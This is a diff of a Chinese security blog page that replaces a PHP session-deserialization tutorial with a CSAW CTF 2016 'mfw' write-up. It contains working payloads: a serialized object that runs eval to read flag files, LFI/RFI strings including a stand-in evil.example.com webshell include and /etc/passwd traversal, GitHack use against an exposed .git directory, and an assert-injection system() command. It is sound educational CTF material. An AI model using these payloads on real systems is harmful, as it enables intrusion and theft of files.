@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Session_unserlize | Hexo</title>
-  <meta name="keywords" content=" serialize , php ">
-  <meta name="description" content="Session_unserlize | Hexo">
+  <title>CSAW CTF 2016 mfw Writeup | Hexo</title>
+  <meta name="keywords" content=" WP ">
+  <meta name="description" content="CSAW CTF 2016 mfw Writeup | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="session的反序列化利用">
 <meta name="keywords" content="serialize,php">
@@ -426,9 +426,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-session_unserialize" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CSAW CTF 2016 mfw Writeup" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Session_unserlize</h1>
+        <h1 class="article-title">CSAW CTF 2016 mfw Writeup</h1>
     
     <div class="article-meta">
         
@@ -436,23 +436,21 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="serialize">serialize</a>
+                <a href="javascript:" data-rel="WP">WP</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">serialize</a>
-            
-            <a href="javascript:" class="color4">php</a>
+            <a href="javascript:" class="color3">WP</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-01 19:53:15'>2019-08-01 19:33</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-01 19:49:47'>2018-03-23 15:13</time>
         
     </div>
     <div class="article-meta">
@@ -474,7 +472,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#对魔法函数的再次认识"><span class="toc-text">对魔法函数的再次认识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用方法"><span class="toc-text">常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#序列化机制"><span class="toc-text">序列化机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-text">__toString()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-反序列化"><span class="toc-text">session 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设置session序列化方法可能带来的隐患"><span class="toc-text">设置session序列化方法可能带来的隐患</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-upload-progress"><span class="toc-text">session.upload_progress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-text">phpinfo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSAW-CTF-2016-mfw-Writeup"><span class="toc-text">CSAW CTF 2016 mfw Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-需要知道的"><span class="toc-text">0x01 需要知道的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-本地文件包含"><span class="toc-text">0x02 本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-git源码泄露"><span class="toc-text">0x03 git源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-题目"><span class="toc-text">0x04 题目</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -489,207 +487,87 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>session的反序列化利用</p>
+        <p>i cant input chinese,so,here is my poor english !</p>
 <a id="more"></a>
-<p>8/1/2019 10:44:57 AM </p>
-<h2 id="对魔法函数的再次认识"><a href="#对魔法函数的再次认识" class="headerlink" title="对魔法函数的再次认识"></a>对魔法函数的再次认识</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code>__construct()//创建对象时触发
-__destruct() //对象被销毁时触发
-__call() //在对象上下文中调用不可访问的方法时触发
-__callStatic() //在静态上下文中调用不可访问的方法时触发
-__get() //用于从不可访问的属性读取数据
-__set() //用于将数据写入不可访问的属性
-__isset() //在不可访问的属性上调用isset()或empty()触发
-__unset() //在不可访问的属性上使用unset()时触发
-__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h4><pre><code>String
-s:size:value;
-Integer
-i:value;
-Boolean
-b:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &#39;1&#39; or &#39;0&#39;)
-Null
-N;
-Array
-a:size:{key definition;value definition;(repeated per element)}
-Object
-O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
-<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
-</blockquote>
-<p>也就是说序列化时没有被利用到的属性会被清理。</p>
-<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote>
-<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
-</blockquote>
-<p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p>
-<p>拿<a href="https://xz.aliyun.com/t/3674#toc-5" title="师傅博客" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p>
-<pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-
-public function getInfo(){
-echo $this-&gt;info . &#39;&lt;br&gt;&#39;;
-}
-/**
- * serialize前调用 用于删选需要被序列化存储的成员变量
- * @return array [description]
- */
-public function __sleep(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-return [&#39;ID&#39;, &#39;sex&#39;, &#39;age&#39;];
-}
-
-/**
- * unserialize前调用 用于预先准备对象资源
- */
-public function __wakeup(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-}
-
-$me = new Caiji(&#39;Luc1fer&#39;, 20, &#39;male&#39;);
-
-$me-&gt;getInfo();
-//存在__sleep(函数，$info属性不会被存储
-$temp = serialize($me);
-echo $temp . &#39;&lt;br&gt;&#39;;
-
-$me = unserialize($temp);
-//__wakeup()组装的$info
-$me-&gt;getInfo();
-
-?&gt;</code></pre><p>执行结果如下 ：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="魔法函数执行结果"></p>
-<p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="修改之后的效果"></p>
-<p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p>
-<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote>
-<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p>
-</blockquote>
-<pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-
-public function __toString(){
-return $this-&gt;info;
-}
-}
-
-$me = new Caiji(&#39;twosmi1e&#39;, 20, &#39;male&#39;);
-echo &#39;__toString:&#39; . $me . &#39;&lt;br&gt;&#39;;
+<h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol>
+<li>本地文件包含</li>
+<li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li>
+</ol>
+<p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p>
+<hr>
+<p>** most notable are the include and require statements.**</p>
+<hr>
+<p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p>
+<hr>
+<p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p>
+<hr>
+<p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p>
+<hr>
+<p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p>
+<p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p>
+<p>Example：</p>
+<pre><code>&lt;?php
+   if ( isset( $_GET[&#39;language&#39;] ) ) {
+  include( $_GET[&#39;language&#39;] . &#39;.php&#39; );
+   }
 ?&gt;
-
-__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session 反序列化"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p>
-<p>这是php.ini中的配置项</p>
-<p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfo配置"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p>
-<ul>
-<li><code>session.save_path</code> 设置session的存储路径</li>
-<li><code>session.save_handler</code> 设定用户自定义存储函数</li>
-<li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li>
-<li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li>
-</ul>
-<p>对于处理器，常用的有三种，对应三种不同的处理格式</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="处理器的处理方式"></p>
-<p>我们可以看看不同储存方式储存的区别：</p>
-<p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p>
-<pre><code>&lt;?
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-
-$_SESSION[&#39;name&#39;] = &#39;Luc1fer&#39;;
-
-?&gt;
-
-php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}
-php: name|s:7:&quot;Luc1fer&quot;;
-php_binary: **EOT**names:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p>
-<h3 id="设置session序列化方法可能带来的隐患"><a href="#设置session序列化方法可能带来的隐患" class="headerlink" title="设置session序列化方法可能带来的隐患"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p>
-<pre><code>&lt;?php
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-name = _GET[&#39;name&#39;] ? _GET[&#39;name&#39;] : &quot;name&quot;; value = _GET[&#39;value&#39;] ? _GET[&#39;value&#39;] : &quot;value&quot;;
-_SESSION[name] = value;  if(isset(_GET[&#39;clean&#39;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php\_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php\_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p>
-<p>我们可以通过此来利用反序列化漏洞。</p>
-<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote>
-<p>Session 上传进度 </p>
-</blockquote>
+&lt;form method=&quot;get&quot;&gt;
+   &lt;select name=&quot;language&quot;&gt;
+      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;
+      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;
+      ...
+   &lt;/select&gt;
+   &lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;</code></pre><p>以下是payload:</p>
+<pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)
+/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)
+/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]
+/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p>
+<h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p>
+<p>查看源码，发现可能的漏洞</p>
+<p><img src="https://i.imgur.com/Qutnt0L.png" alt></p>
+<p>于是我们尝试用文件包含来获取密码信息</p>
+<pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p>
+<p>看到about页面说使用了git</p>
+<p><img src="https://i.imgur.com/qHNE2ot.png" alt></p>
+<p>想到.git源码泄露，访问.git文件，发现可以访问</p>
+<p><img src="https://i.imgur.com/V87suOa.png" alt></p>
+<p>我们使用 工具GitHack将网站源码clone下来。</p>
 <blockquote>
-<p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p>
+<p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
 </blockquote>
+<p>GitHack的工作原理是</p>
 <blockquote>
-<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p>
+<p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>
 </blockquote>
-<p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p>
-<p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p>
-<p>通过上面两部分我们可以更改session为自定义数据。</p>
-<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
+<p>使用命令：</p>
+<pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p>
 <pre><code>&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
-session_start();
-class OowoO
-{
-    public $mdzz;
-    function __construct()
-    {
-        $this-&gt;mdzz = &#39;phpinfo();&#39;;
-    }
-
-    function __destruct()
-    {
-        eval($this-&gt;mdzz);
-    }
-}
-if(isset($_GET[&#39;phpinfo&#39;]))
-{
-    $m = new OowoO();
-}
-else
-{
-    highlight_string(file_get_contents(&#39;index.php&#39;));
-}
-?&gt;</code></pre><p>观察到题目phpinfo中的配置</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p>
-<p>构造一个POST页面</p>
-<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
-&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
-&lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。</p>
-<p>然后进行序列化。将处理器设置为<code>php_serialize</code></p>
+// TODO
+// $FLAG = &#39;&#39;;
+?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p>
 <pre><code>&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-class OowoO
-{
-public $mdzz;
 
+if (isset($_GET[&#39;page&#39;])) {
+$page = $_GET[&#39;page&#39;];
+} else {
+    $page = &quot;home&quot;;
 }
-$a = new OowoO();
-$a-&gt;mdzz = &#39;print_r(scandir(dirname(__FILE__)));&#39;;
-echo serialize($a);
-?&gt;</code></pre><p>得到</p>
-<pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了保持格式一致要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p>
-<p>读到如下信息</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p>
-<p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p>
-<p>于是我们修改mdzz的值为</p>
-<pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p>
-<pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p>
-<pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
-<p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p>
-<p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p>
-<p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p>
-</blockquote>
+
+$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+
+// I heard &#39;..&#39; is dangerous!
+assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+
+// TODO: Make this look nice
+assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);
+
+?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p>
+<p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p>
+<p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p>
+<p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p>
+<pre><code>flag&#39;,&#39;..&#39;)+or+system(&#39;cat+templates/flag.php&#39;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p>
+<p>大神就是大神！</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 brainsemail@163.com </span>
@@ -703,12 +581,12 @@ echo serialize($a);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Session_unserlize</p>
+    <p><span class="copy-title">文章标题:</span>CSAW CTF 2016 mfw Writeup</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="Luc1fer">Luc1fer</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-01, 19:33:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:53:15</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/01/session_unserialize/" title="Session_unserlize">https://github.com/BrainLyh/2019/08/01/session_unserialize/</a>
+    <p><span class="copy-title">发布时间:</span>2018-03-23, 15:13:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-01, 19:49:47</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2018/03/23/CSAW CTF 2016 mfw Writeup/" title="CSAW CTF 2016 mfw Writeup">https://github.com/BrainLyh/2018/03/23/CSAW CTF 2016 mfw Writeup/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
